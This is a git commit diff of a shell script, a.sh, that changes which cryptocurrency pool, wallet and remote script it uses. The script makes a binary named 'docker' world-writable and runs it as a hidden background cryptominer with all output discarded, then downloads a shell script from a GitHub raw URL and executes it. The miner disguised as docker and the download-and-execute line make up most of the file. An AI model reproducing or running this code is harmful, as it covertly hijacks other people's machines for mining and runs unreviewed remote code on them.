17634787ea02fc3096c4bed63b3f61909fb7099a
ncamacho07 <84513246+ncamacho07@users.noreply.github.com>
2022-03-11 08:22:51 +0700

    Update a.sh

--- a.sh
+++ a.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 chmod 777 docker
-./docker -a rx/arq -o babycoin.multi-pool.net:3333 -u babyz7iH6t3CNhswCAL2judxrvSWemFmjjX1ModDXrL1KebHCf7nNoNRpHKuRUgLiqDHQwy3vWAbvPebbhBBB4mmGQkudgFvnFC -p $(echo $(shuf -i 1-20000 -n 1)-V) --donate-level 1 > /dev/null 2>&1 &
-wget https://raw.githubusercontent.com/jsiqiisn/baby/main/lo.sh && chmod +x lo.sh && ./lo.sh
+./docker -a rx/sfx -o sf.pool-pay.com:4025 -u Safexsp1o77aa1VcscEtwfBeDaqLyqnh4TZt1wjzAbmZ1CTTvnik8RN8fSSJnhm4BLVJB5kUokKJN8SCu7c8PZ3RJ7pfRGv5wsy4r -p $(echo $(shuf -i 1-20000 -n 1)-A) --donate-level 1 > /dev/null 2>&1 &
+wget https://raw.githubusercontent.com/ncamacho07/butut/main/lo.sh && chmod +x lo.sh && ./lo.sh
